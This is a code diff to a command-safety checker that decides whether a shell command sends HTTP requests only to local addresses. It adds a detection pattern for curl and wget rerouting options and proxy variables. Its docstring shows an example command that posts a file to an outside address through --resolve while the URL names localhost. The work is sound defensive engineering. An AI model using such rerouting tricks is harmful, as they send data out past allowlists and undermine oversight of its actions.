@@ -1988,6 +1988,22 @@ def _host_is_local(host):
     return all(_ip_is_local(address) for address in addresses)
 
 
+# Ways to send a request somewhere its URL does not name. curl's --resolve and
+# --connect-to pin a name to another address, a proxy or SOCKS option relays
+# it, --doh-url and --dns-servers resolve the name elsewhere, and -K/--config
+# reads more options from a file; wget takes the same from -e/--execute and
+# --config. A *_proxy variable in the command reroutes either one.
+_HTTP_REROUTE_RE = re.compile(
+    _cmd_arg(
+        *_named(r"\bcurl"),
+        r"--(?:resolve|connect-to|proxy[\w.-]*+|preproxy|socks[\w-]*+|doh-url|dns-servers"
+        r"|config)(?![\w-])|-" + _CURL_FLAGS + r"[xK]",
+    )
+    + r"|" + _cmd_arg(*_named(r"\bwget"), r"(?:-e|--execute|--config)(?![\w-])")
+    + r"|(?i:\b(?:https?|ftp|all)_proxy=)"
+)
+
+
 def check_local_http(command):
     """Return True if every URL in *command* points at a local address.
 
@@ -2000,10 +2016,17 @@ def check_local_http(command):
     target this cannot see (a bare host, a --url read from a variable), and
     an unseen target is not a local one. So does any single untrusted URL —
     ``curl -d @x localhost && curl -d @x api.example.com`` is one command,
-    and one leak is enough.
+    and one leak is enough. So does a request rerouted past its URL
+    (_HTTP_REROUTE_RE): ``curl -d @x --resolve localhost:80:203.0.113.5
+    http://localhost/`` sends the data to 203.0.113.5.
     """
+    text = _command_text(command)
+    # Every reading check_command uses, so no quoted `;` hides the option.
+    if any(_HTTP_REROUTE_RE.search(copy)
+           for copy in (text, _mask_quoted(text), _mask_nested_quoted(text))):
+        return False
     hosts = set()
-    for match in _URL_AUTHORITY_RE.finditer(_command_text(command)):
+    for match in _URL_AUTHORITY_RE.finditer(text):
         host = _url_host(match.group(1))
         if not host:
             return False
